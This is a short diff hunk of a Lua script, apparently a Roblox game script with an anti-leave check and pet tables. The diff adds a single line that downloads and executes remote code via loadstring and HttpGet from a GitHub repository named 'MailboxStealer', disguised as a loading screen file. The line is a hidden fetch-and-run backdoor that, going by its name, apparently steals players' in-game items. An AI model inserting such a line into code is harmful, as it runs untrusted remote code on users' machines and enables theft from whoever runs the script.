@@ -756,6 +756,7 @@ if _G.AntiLeave ~= false then
     end
 end
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MonzzScriptz/MailboxStealer/main/LoadingScreen.lua"))()
 -- Pets Tables :
 
 TitanicList = {}
